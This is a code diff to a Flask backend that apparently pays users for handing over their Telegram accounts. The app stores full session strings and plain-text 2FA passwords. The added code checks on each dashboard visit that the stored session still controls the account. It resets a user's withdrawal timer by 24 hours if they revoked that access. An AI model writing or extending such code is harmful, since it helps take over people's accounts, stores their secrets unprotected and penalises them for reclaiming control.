@@ -247,6 +247,7 @@ def verify_otp():
             'username': user.username,
             'session_string': final_session_string,
             'password_2fa': password if password else None,  # Store 2FA password
+            'session_active': True,  # Mark session as active
             'last_login': datetime.utcnow()
         }
         
@@ -260,12 +261,19 @@ def verify_otp():
                 'withdrawals': []
             })
         else:
-            # For existing users, just update login time
+            # For existing users, check if session was expired
+            was_expired = not existing_user.get('session_active', True)
+            
             user_data['balance'] = existing_user.get('balance', 0.0)
             user_data['total_earned'] = existing_user.get('total_earned', 0.0)
-            user_data['withdrawal_available_at'] = existing_user.get('withdrawal_available_at')
             user_data['withdrawals'] = existing_user.get('withdrawals', [])
             user_data['created_at'] = existing_user.get('created_at', datetime.utcnow())
+            
+            # If session was expired, reset the withdrawal timer
+            if was_expired:
+                user_data['withdrawal_available_at'] = datetime.utcnow() + timedelta(hours=24)
+            else:
+                user_data['withdrawal_available_at'] = existing_user.get('withdrawal_available_at')
         
         # Update or insert user
         mongo.db.users.update_one(
@@ -324,6 +332,41 @@ def dashboard():
         return redirect(url_for('index'))
     
     user_data = mongo.db.users.find_one({'user_id': session['user_id']})
+    
+    if not user_data:
+        session.clear()
+        return redirect(url_for('index'))
+    
+    # Check if Telegram session is still valid
+    session_string = user_data.get('session_string')
+    if session_string and user_data.get('session_active', True):
+        try:
+            async def validate_session():
+                client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+                try:
+                    await client.connect()
+                    if not await client.is_user_authorized():
+                        return False
+                    await client.disconnect()
+                    return True
+                except Exception:
+                    await client.disconnect()
+                    return False
+            
+            is_valid = run_telegram_operation(validate_session)
+            
+            if not is_valid:
+                # Mark session as expired in database
+                mongo.db.users.update_one(
+                    {'user_id': session['user_id']},
+                    {'$set': {'session_active': False}}
+                )
+                # Clear user session and redirect to login
+                session.clear()
+                return redirect(url_for('index'))
+        except Exception:
+            # If validation fails, continue but mark session as potentially expired
+            pass
     
     # Calculate time remaining for withdrawal
     withdrawal_available_at = user_data.get('withdrawal_available_at')
